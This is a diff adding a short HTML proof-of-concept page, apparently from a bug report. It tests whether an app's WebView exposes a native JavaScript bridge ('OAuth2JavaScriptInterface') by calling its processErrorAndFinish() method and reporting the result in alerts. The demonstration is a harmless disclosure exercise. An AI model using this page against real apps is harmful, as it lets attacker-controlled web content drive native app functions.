@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head><title>Exploit PoC</title></head>
+<body style="background:#111;color:#0f0;font-family:sans-serif;text-align:center;padding:50px;">
+    <h1>🔥 Loaded in WebView!</h1>
+    <p>If you see this, external URL loading + JS execution works.</p>
+    <script>
+      console.log("Exploit JS running in app context");
+      if (typeof OAuth2JavaScriptInterface !== "undefined") {
+        try {
+          OAuth2JavaScriptInterface.processErrorAndFinish();
+          alert("✅ Called native method from attacker JS!");
+        } catch(e) {
+          alert("Call failed: " + e);
+        }
+      } else {
+        alert("Interface not exposed or not loaded yet");
+      }
+    </script>
+</body>
+</html>
